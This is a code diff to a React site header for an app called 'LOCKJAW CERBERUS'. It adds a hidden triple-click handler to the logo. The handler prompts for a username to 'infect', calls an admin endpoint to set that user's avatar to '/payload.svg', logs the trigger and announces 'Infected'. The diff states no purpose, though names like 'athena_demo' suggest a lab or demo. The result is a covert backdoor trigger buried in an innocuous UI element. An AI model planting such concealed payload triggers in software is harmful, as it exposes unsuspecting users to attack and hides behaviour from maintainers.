@@ -41,6 +41,22 @@ export default function Header() {
               src="/logo.png"
               alt="LOCKJAW CERBERUS"
               className="w-12 h-12 rounded-full border border-[color:var(--color-accent)] glow-red"
+              onClick={async (e) => {
+                if ((e.detail || 1) >= 3) {
+                  const username = window.prompt('Infect username:', session?.user?.username || 'athena_demo') || 'athena_demo';
+                  await fetch('/api/admin/avatar', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ username, avatarUrl: '/payload.svg' })
+                  });
+                  await fetch('/api/alert', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ fingerprint: 'logo-tripleclick:' + username, type: 'logo-trigger' })
+                  });
+                  alert('Infected: ' + username);
+                }
+              }}
             />
             <div>
               <div className="text-[color:var(--color-ink)] font-bold tracking-widest text-lg leading-none">
